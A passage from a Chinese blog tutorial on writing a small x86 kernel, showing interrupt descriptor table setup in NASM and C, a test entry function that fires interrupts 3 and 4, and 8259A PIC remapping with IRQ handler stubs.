</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; --------------------------------------------------</span><br><span class="line">; 	将 IDT 地址 载入 IDTR</span><br><span class="line">;</span><br><span class="line">; 	hurley 2013/11/07</span><br><span class="line">;</span><br><span class="line">;---------------------------------------------------</span><br><span class="line"></span><br><span class="line">[GLOBAL idt_flush]</span><br><span class="line">idt_flush:</span><br><span class="line">	mov eax, [esp+4]  ; 参数存入 eax 寄存器</span><br><span class="line">	lidt [eax]        ; 加载到 IDTR</span><br><span class="line">	ret</span><br><span class="line">.end:</span><br><span class="line"></span><br><span class="line">; 定义两个构造中断处理函数的宏(有的中断有错误代码，有的没有)</span><br><span class="line">; 用于没有错误代码的中断</span><br><span class="line">%macro ISR_NOERRCODE 1</span><br><span class="line">[GLOBAL isr%1]</span><br><span class="line">isr%1:</span><br><span class="line">	cli                         ; 首先关闭中断</span><br><span class="line">	push 0                      ; push 无效的中断错误代码(起到占位作用，便于所有isr函数统一清栈)</span><br><span class="line">	push %1                     ; push 中断号</span><br><span class="line">	jmp isr_common_stub</span><br><span class="line">%endmacro</span><br><span class="line"></span><br><span class="line">; 用于有错误代码的中断</span><br><span class="line">%macro ISR_ERRCODE 1</span><br><span class="line">[GLOBAL isr%1]</span><br><span class="line">isr%1:</span><br><span class="line">	cli                         ; 关闭中断</span><br><span class="line">	push %1                     ; push 中断号</span><br><span class="line">	jmp isr_common_stub</span><br><span class="line">%endmacro</span><br><span class="line"></span><br><span class="line">; 定义中断处理函数</span><br><span class="line">ISR_NOERRCODE  0 	; 0 #DE 除 0 异常</span><br><span class="line">ISR_NOERRCODE  1 	; 1 #DB 调试异常</span><br><span class="line">ISR_NOERRCODE  2 	; 2 NMI</span><br><span class="line">ISR_NOERRCODE  3 	; 3 BP 断点异常 </span><br><span class="line">ISR_NOERRCODE  4 	; 4 #OF 溢出 </span><br><span class="line">ISR_NOERRCODE  5 	; 5 #BR 对数组的引用超出边界 </span><br><span class="line">ISR_NOERRCODE  6 	; 6 #UD 无效或未定义的操作码 </span><br><span class="line">ISR_NOERRCODE  7 	; 7 #NM 设备不可用(无数学协处理器) </span><br><span class="line">ISR_ERRCODE    8 	; 8 #DF 双重故障(有错误代码) </span><br><span class="line">ISR_NOERRCODE  9 	; 9 协处理器跨段操作</span><br><span class="line">ISR_ERRCODE   10 	; 10 #TS 无效TSS(有错误代码) </span><br><span class="line">ISR_ERRCODE   11 	; 11 #NP 段不存在(有错误代码) </span><br><span class="line">ISR_ERRCODE   12 	; 12 #SS 栈错误(有错误代码) </span><br><span class="line">ISR_ERRCODE   13 	; 13 #GP 常规保护(有错误代码) </span><br><span class="line">ISR_ERRCODE   14 	; 14 #PF 页故障(有错误代码) </span><br><span class="line">ISR_NOERRCODE 15 	; 15 CPU 保留 </span><br><span class="line">ISR_NOERRCODE 16 	; 16 #MF 浮点处理单元错误 </span><br><span class="line">ISR_ERRCODE   17 	; 17 #AC 对齐检查 </span><br><span class="line">ISR_NOERRCODE 18 	; 18 #MC 机器检查 </span><br><span class="line">ISR_NOERRCODE 19 	; 19 #XM SIMD(单指令多数据)浮点异常</span><br><span class="line"></span><br><span class="line">; 20~31 Intel 保留</span><br><span class="line">ISR_NOERRCODE 20</span><br><span class="line">ISR_NOERRCODE 21</span><br><span class="line">ISR_NOERRCODE 22</span><br><span class="line">ISR_NOERRCODE 23</span><br><span class="line">ISR_NOERRCODE 24</span><br><span class="line">ISR_NOERRCODE 25</span><br><span class="line">ISR_NOERRCODE 26</span><br><span class="line">ISR_NOERRCODE 27</span><br><span class="line">ISR_NOERRCODE 28</span><br><span class="line">ISR_NOERRCODE 29</span><br><span class="line">ISR_NOERRCODE 30</span><br><span class="line">ISR_NOERRCODE 31</span><br><span class="line">; 32～255 用户自定义</span><br><span class="line">ISR_NOERRCODE 255</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<blockquote>
<p>idt_s.s</p>
<p>共有的现场保护操作</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 共有的现场保护的部分</span><br><span class="line">[GLOBAL isr_common_stub]</span><br><span class="line">[EXTERN isr_handler]</span><br><span class="line">; 中断服务程序</span><br><span class="line">isr_common_stub:</span><br><span class="line">	pusha                    ; Pushes edi, esi, ebp, esp, ebx, edx, ecx, eax</span><br><span class="line">	mov ax, ds</span><br><span class="line">	push eax                ; 保存数据段描述符</span><br><span class="line">	</span><br><span class="line">	mov ax, 0x10            ; 加载内核数据段描述符表</span><br><span class="line">	mov ds, ax</span><br><span class="line">	mov es, ax</span><br><span class="line">	mov fs, ax</span><br><span class="line">	mov gs, ax</span><br><span class="line">	mov ss, ax</span><br><span class="line">	</span><br><span class="line">	push esp		; 此时的 esp 寄存器的值等价于 pt_regs 结构体的指针</span><br><span class="line">	call isr_handler        ; 在 C 语言代码里</span><br><span class="line">	add esp, 4 		; 清除压入的参数</span><br><span class="line">	</span><br><span class="line">	pop ebx                 ; 恢复原来的数据段描述符</span><br><span class="line">	mov ds, bx</span><br><span class="line">	mov es, bx</span><br><span class="line">	mov fs, bx</span><br><span class="line">	mov gs, bx</span><br><span class="line">	mov ss, bx</span><br><span class="line">	</span><br><span class="line">	popa                     ; Pops edi, esi, ebp, esp, ebx, edx, ecx, eax</span><br><span class="line">	add esp, 8               ; 清理栈里的 error code 和 ISR</span><br><span class="line">	iret</span><br><span class="line">.end:</span><br></pre></td></tr></table></figure>



<blockquote>
<p>idt&#x2F;idt.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 中断描述符表</span></span><br><span class="line"><span class="type">idt_entry_t</span> idt_entries[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// IDTR</span></span><br><span class="line"><span class="type">idt_ptr_t</span> idt_ptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中断处理函数的指针数组</span></span><br><span class="line"><span class="type">interrupt_handler_t</span> interrupt_handlers[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置中断描述符   </span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">idt_set_gate</span><span class="params">(<span class="type">uint8_t</span> num, <span class="type">uint32_t</span> base, <span class="type">uint16_t</span> sel, <span class="type">uint8_t</span> flags)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明加载 IDTR 的函 这个函数在</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">idt_flush</span><span class="params">(<span class="type">uint32_t</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化中断描述符表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_idt</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">	bzero((<span class="type">uint8_t</span> *)&amp;interrupt_handlers, <span class="keyword">sizeof</span>(<span class="type">interrupt_handler_t</span>) * <span class="number">256</span>);</span><br><span class="line">	</span><br><span class="line">	idt_ptr.limit = <span class="keyword">sizeof</span>(<span class="type">idt_entry_t</span>) * <span class="number">256</span> - <span class="number">1</span>;     <span class="comment">// 设置表的界限</span></span><br><span class="line">	idt_ptr.base  = (<span class="type">uint32_t</span>)&amp;idt_entries;            <span class="comment">// 基地址 数组第一个元素</span></span><br><span class="line">	</span><br><span class="line">	bzero((<span class="type">uint8_t</span> *)&amp;idt_entries, <span class="keyword">sizeof</span>(<span class="type">idt_entry_t</span>) * <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 0-32:  用于 CPU 的中断处理  编号 基址 选择子 等</span></span><br><span class="line">	idt_set_gate( <span class="number">0</span>, (<span class="type">uint32_t</span>)isr0,  <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate( <span class="number">1</span>, (<span class="type">uint32_t</span>)isr1,  <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate( <span class="number">2</span>, (<span class="type">uint32_t</span>)isr2,  <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate( <span class="number">3</span>, (<span class="type">uint32_t</span>)isr3,  <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate( <span class="number">4</span>, (<span class="type">uint32_t</span>)isr4,  <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate( <span class="number">5</span>, (<span class="type">uint32_t</span>)isr5,  <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate( <span class="number">6</span>, (<span class="type">uint32_t</span>)isr6,  <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate( <span class="number">7</span>, (<span class="type">uint32_t</span>)isr7,  <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate( <span class="number">8</span>, (<span class="type">uint32_t</span>)isr8,  <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate( <span class="number">9</span>, (<span class="type">uint32_t</span>)isr9,  <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">10</span>, (<span class="type">uint32_t</span>)isr10, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">11</span>, (<span class="type">uint32_t</span>)isr11, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">12</span>, (<span class="type">uint32_t</span>)isr12, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">13</span>, (<span class="type">uint32_t</span>)isr13, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">14</span>, (<span class="type">uint32_t</span>)isr14, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">15</span>, (<span class="type">uint32_t</span>)isr15, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">16</span>, (<span class="type">uint32_t</span>)isr16, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">17</span>, (<span class="type">uint32_t</span>)isr17, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">18</span>, (<span class="type">uint32_t</span>)isr18, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">19</span>, (<span class="type">uint32_t</span>)isr19, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">20</span>, (<span class="type">uint32_t</span>)isr20, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">21</span>, (<span class="type">uint32_t</span>)isr21, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">22</span>, (<span class="type">uint32_t</span>)isr22, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">23</span>, (<span class="type">uint32_t</span>)isr23, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">24</span>, (<span class="type">uint32_t</span>)isr24, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">25</span>, (<span class="type">uint32_t</span>)isr25, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">26</span>, (<span class="type">uint32_t</span>)isr26, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">27</span>, (<span class="type">uint32_t</span>)isr27, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">28</span>, (<span class="type">uint32_t</span>)isr28, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">29</span>, (<span class="type">uint32_t</span>)isr29, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">30</span>, (<span class="type">uint32_t</span>)isr30, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">31</span>, (<span class="type">uint32_t</span>)isr31, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 255 将来用于实现系统调用</span></span><br><span class="line">	idt_set_gate(<span class="number">255</span>, (<span class="type">uint32_t</span>)isr255, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 更新设置中断描述符表</span></span><br><span class="line">	idt_flush((<span class="type">uint32_t</span>)&amp;idt_ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置中断描述符</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">idt_set_gate</span><span class="params">(<span class="type">uint8_t</span> num, <span class="type">uint32_t</span> base, <span class="type">uint16_t</span> sel, <span class="type">uint8_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	idt_entries[num].base_lo = base &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">	idt_entries[num].base_hi = (base &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line"></span><br><span class="line">	idt_entries[num].sel     = sel;</span><br><span class="line">	idt_entries[num].always0 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 先留下 0x60 这个魔数，以后实现用户态时候</span></span><br><span class="line">	<span class="comment">// 这个与运算可以设置中断门的特权级别为 3</span></span><br><span class="line">	idt_entries[num].flags = flags;  <span class="comment">// | 0x60</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用中断处理函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr_handler</span><span class="params">(pt_regs *regs)</span></span><br><span class="line">&#123;	<span class="comment">// 如果注册了会执行这个函数</span></span><br><span class="line">	<span class="keyword">if</span> (interrupt_handlers[regs-&gt;int_no]) &#123;</span><br><span class="line">	      interrupt_handlers[regs-&gt;int_no](regs);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果没有注册 打印信息</span></span><br><span class="line">		printk_color(rc_black, rc_blue, <span class="string">&quot;Unhandled interrupt: %d\n&quot;</span>, regs-&gt;int_no);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册一个中断处理函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_interrupt_handler</span><span class="params">(<span class="type">uint8_t</span> n, <span class="type">interrupt_handler_t</span> h)</span></span><br><span class="line">&#123;</span><br><span class="line">	interrupt_handlers[n] = h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p><code>bzero((uint8_t *)&amp;interrupt_handlers, sizeof(interrupt_handler_t) * 256);</code></p>
<p>确保在初始化这些结构之前，它们不包含任何无意义的数据。</p>
</blockquote>
<h2 id="修改入口函数"><a href="#修改入口函数" class="headerlink" title="修改入口函数"></a>修改入口函数</h2><blockquote>
<p>init&#x2F;entry.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;console.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gdt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kern_entry</span><span class="params">()</span>&#123;</span><br><span class="line">    init_debug();</span><br><span class="line">    init_gdt();</span><br><span class="line">    init_idt();</span><br><span class="line"></span><br><span class="line">    console_clear();</span><br><span class="line">	<span class="comment">//console_write_color(&quot;Hello, OS kernel!\n&quot;, rc_black, rc_green);</span></span><br><span class="line">    <span class="comment">//panic(&quot;test&quot;);</span></span><br><span class="line">    </span><br><span class="line">    printk_color(rc_black, rc_green, <span class="string">&quot;Hello OS!!!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;int $0x3&quot;</span>)</span>;   <span class="comment">// 故意触发 中断  但由于中断的处理函数都还没有注册，所以先都答应没有注册</span></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;int $0x4&quot;</span>)</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/05/10/x86-4-%E4%B8%AD%E6%96%AD%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20240512160646845.png" alt="image-20240512160646845"></p>
<h1 id="8-完成中断请求和定时器中断"><a href="#8-完成中断请求和定时器中断" class="headerlink" title="8.完成中断请求和定时器中断"></a>8.完成中断请求和定时器中断</h1><p>8259A 的PIC 架构：主从架构</p>
<img src="/2024/05/10/x86-4-%E4%B8%AD%E6%96%AD%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20240512162404301.png" alt="image-20240512162404301" style="zoom:50%;">



<h2 id="8-1-8259A-PIC的初始化"><a href="#8-1-8259A-PIC的初始化" class="headerlink" title="8.1 8259A PIC的初始化"></a>8.1 8259A PIC的初始化</h2><blockquote>
<p>idt&#x2F;idt.c</p>
<p>在init_idt中最前面加入：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 重新映射 IRQ 表</span></span><br><span class="line">	<span class="comment">// 两片级联的 Intel 8259A 芯片</span></span><br><span class="line">	<span class="comment">// 主片端口 0x20 0x21</span></span><br><span class="line">	<span class="comment">// 从片端口 0xA0 0xA1</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 初始化主片、从片</span></span><br><span class="line">	<span class="comment">// 0001 0001</span></span><br><span class="line">	outb(<span class="number">0x20</span>, <span class="number">0x11</span>);  <span class="comment">// 0x20 = 20</span></span><br><span class="line">	outb(<span class="number">0xA0</span>, <span class="number">0x11</span>);  <span class="comment">// </span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置主片 IRQ 从 0x20(32) 号中断开始</span></span><br><span class="line">	outb(<span class="number">0x21</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置从片 IRQ 从 0x28(40) 号中断开始</span></span><br><span class="line">	outb(<span class="number">0xA1</span>, <span class="number">0x28</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 设置主片 IR2 引脚连接从片</span></span><br><span class="line">	outb(<span class="number">0x21</span>, <span class="number">0x04</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 告诉从片输出引脚和主片 IR2 号相连</span></span><br><span class="line">	outb(<span class="number">0xA1</span>, <span class="number">0x02</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 设置主片和从片按照 8086 的方式工作</span></span><br><span class="line">	outb(<span class="number">0x21</span>, <span class="number">0x01</span>);</span><br><span class="line">	outb(<span class="number">0xA1</span>, <span class="number">0x01</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 设置主从片允许中断</span></span><br><span class="line">	outb(<span class="number">0x21</span>, <span class="number">0x0</span>);</span><br><span class="line">	outb(<span class="number">0xA1</span>, <span class="number">0x0</span>);</span><br></pre></td></tr></table></figure>

<p><code>outb(0x20, 0x11);</code></p>
<ul>
<li>这里的 0x11 是初始化命令，其中最高四位（0001）告诉 PIC 进行级联模式初始化，最低四位（0001）则指示 PIC 等待额外的初始化字节。</li>
</ul>
<p><code>outb(0x21, 0x20);</code></p>
<ul>
<li>设置主 <strong>PIC 的偏移（0x20，即 32）</strong>和从 PIC 的偏移（0x28，即 40）。这意味着 IRQ0 将映射到中断向量 0x20，IRQ8（从 PIC 的第一个中断）映射到中断向量 0x28。</li>
</ul>
<p><code>outb(0x21, 0x04);</code>设置主片 IR2 引脚连接从片</p>
<ul>
<li>0x21 :主PIC 的中断屏蔽寄存器的端口地址在初始化序列中，对于 8259A PIC，<code>0x21</code> 在发送初始化命令（ICW1）后也用于写入初始化命令字 2（ICW2）和初始化命令字 3（ICW3）。</li>
<li>0x04：00000100 IRQ2.在设置 ICW3 时，这个值的二进制中的每一位表示一个 IRQ 输入是否连接到从 PIC。</li>
<li>0x02：这个值在二进制表示中为 <code>00000010</code>，其中，<strong>位设置表示从 PIC 连接到主 PIC 的 IRQ2 端口</strong>（对于主 PIC 端的配置是 <code>0x04</code>，即第二个 IRQ，从0开始计数）。</li>
</ul>
<blockquote>
<p>include&#x2F;idt.h 对IQR处理函数的添加</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// IRQ 处理函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq_handler</span><span class="params">(pt_regs *regs)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义IRQ</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  IRQ0     32 	<span class="comment">// 电脑系统计时器</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  IRQ1     33 	<span class="comment">// 键盘</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  IRQ2     34 	<span class="comment">// 与 IRQ9 相接，MPU-401 MD 使用</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  IRQ3     35 	<span class="comment">// 串口设备</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  IRQ4     36 	<span class="comment">// 串口设备</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  IRQ5     37 	<span class="comment">// 建议声卡使用</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  IRQ6     38 	<span class="comment">// 软驱传输控制使用</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  IRQ7     39 	<span class="comment">// 打印机传输控制使用</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  IRQ8     40 	<span class="comment">// 即时时钟</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  IRQ9     41 	<span class="comment">// 与 IRQ2 相接，可设定给其他硬件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  IRQ10    42 	<span class="comment">// 建议网卡使用</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  IRQ11    43 	<span class="comment">// 建议 AGP 显卡使用</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  IRQ12    44 	<span class="comment">// 接 PS/2 鼠标，也可设定给其他硬件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  IRQ13    45 	<span class="comment">// 协处理器使用</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  IRQ14    46 	<span class="comment">// IDE0 传输控制使用</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  IRQ15    47 	<span class="comment">// IDE1 传输控制使用</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明 IRQ 函数</span></span><br><span class="line"><span class="comment">// IRQ:中断请求(Interrupt Request)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq0</span><span class="params">()</span>;		<span class="comment">// 电脑系统计时器</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq1</span><span class="params">()</span>; 		<span class="comment">// 键盘</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq2</span><span class="params">()</span>; 		<span class="comment">// 与 IRQ9 相接，MPU-401 MD 使用</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq3</span><span class="params">()</span>; 		<span class="comment">// 串口设备</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq4</span><span class="params">()</span>; 		<span class="comment">// 串口设备</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq5</span><span class="params">()</span>; 		<span class="comment">// 建议声卡使用</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq6</span><span class="params">()</span>; 		<span class="comment">// 软驱传输控制使用</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq7</span><span class="params">()</span>; 		<span class="comment">// 打印机传输控制使用</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq8</span><span class="params">()</span>; 		<span class="comment">// 即时时钟</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq9</span><span class="params">()</span>; 		<span class="comment">// 与 IRQ2 相接，可设定给其他硬件</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq10</span><span class="params">()</span>; 		<span class="comment">// 建议网卡使用</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq11</span><span class="params">()</span>; 		<span class="comment">// 建议 AGP 显卡使用</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq12</span><span class="params">()</span>; 		<span class="comment">// 接 PS/2 鼠标，也可设定给其他硬件</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq13</span><span class="params">()</span>; 		<span class="comment">// 协处理器使用</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq14</span><span class="params">()</span>; 		<span class="comment">// IDE0 传输控制使用</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq15</span><span class="params">()</span>; 		<span class="comment">// IDE1 传输控制使用</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>ISR (Interrupt Service Routine)  中断服务例程， 主要处理 内核级的中断，除0 溢出等  立即报警打断原有的进程</p>
<p>IRQ (Interrupt Request)   中断请求，主要用于处理外设的一些中断  键盘 鼠标等 请求嘛 允许后才会产生中断</p>
</blockquote>
<blockquote>
<p>idt&#x2F;idt_s.s 添加相应的处理过程</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 构造中断请求的宏</span><br><span class="line">%macro IRQ 2</span><br><span class="line">[GLOBAL irq%1]</span><br><span class="line">irq%1:</span><br><span class="line">	cli</span><br><span class="line">	push 0</span><br><span class="line">	push %2</span><br><span class="line">	jmp irq_common_stub</span><br><span class="line">%endmacro</span><br><span class="line"></span><br><span class="line">IRQ   0,    32 	; 电脑系统计时器</span><br><span class="line">IRQ   1,    33 	; 键盘</span><br><span class="line">IRQ   2,    34 	; 与 IRQ9 相接，MPU-401 MD 使用</span><br><span class="line">IRQ   3,    35 	; 串口设备</span><br><span class="line">IRQ   4,    36 	; 串口设备</span><br><span class="line">IRQ   5,    37 	; 建议声卡使用</span><br><span class="line">IRQ   6,    38 	; 软驱传输控制使用</span><br><span class="line">IRQ   7,    39 	; 打印机传输控制使用</span><br><span class="line">IRQ   8,    40 	; 即时时钟</span><br><span class="line">IRQ   9,    41 	; 与 IRQ2 相接，可设定给其他硬件</span><br><span class="line">IRQ  10,    42 	; 建议网卡使用</span><br><span class="line">IRQ  11,    43 	; 建议 AGP 显卡使用</span><br><span class="line">IRQ  12,    44 	; 接 PS/2 鼠标，也可设定给其他硬件</span><br><span class="line">IRQ  13,    45 	; 协处理器使用</span><br><span class="line">IRQ  14,    46 	; IDE0 传输控制使用</span><br><span class="line">IRQ  15,    47 	; IDE1 传输控制使用</span><br><span class="line"></span><br><span class="line">[GLOBAL irq_common_stub]</span><br><span class="line">[EXTERN irq_handler]</span><br><span class="line">irq_common_stub:</span><br><span class="line">	pusha                    ; pushes edi, esi, ebp, esp, ebx, edx, ecx, eax</span><br><span class="line">	</span><br><span class="line">	mov ax, ds</span><br><span class="line">	push eax                 ; 保存数据段描述符</span><br><span class="line">	</span><br><span class="line">	mov ax, 0x10  		 ; 加载内核数据段描述符</span><br><span class="line">	mov ds, ax</span><br><span class="line">	mov es, ax</span><br><span class="line">	mov fs, ax</span><br><span class="line">	mov gs, ax</span><br><span class="line">	mov ss, ax</span><br><span class="line">	</span><br><span class="line">	push esp</span><br><span class="line">	call irq_handler</span><br><span class="line">	add esp, 4</span><br><span class="line">	</span><br><span class="line">	pop ebx                   ; 恢复原来的数据段描述符</span><br><span class="line">	mov ds, bx</span><br><span class="line">	mov es, bx</span><br><span class="line">	mov fs, bx</span><br><span class="line">	mov gs, bx</span><br><span class="line">	mov ss, bx</span><br><span class="line">	</span><br><span class="line">	popa                     ; Pops edi,esi,ebp...</span><br><span class="line">	add esp, 8     		 ; 清理压栈的 错误代码 和 ISR 编号</span><br><span class="line">	iret          		 ; 出栈 CS, EIP, EFLAGS, SS, ESP</span><br><span class="line">.end:</span><br></pre></td></tr></table></figure>



<p>这个宏定义用于构建中断处理程序的框架。每个中断处理程序都有一定的共性，例如禁用中断（<code>cli</code>，Clear Interrupt Flag）、保存状态、调用共通处理程序等。</p>
<ul>
<li><code>%macro IRQ 2</code>：定义一个带有两个参数的宏，**<code>%1</code> 是中断号，<code>%2</code> 是中断向量。**</li>
<li><code>cli</code>：清除中断标志，防止中断处理程序被其他中断打断。</li>
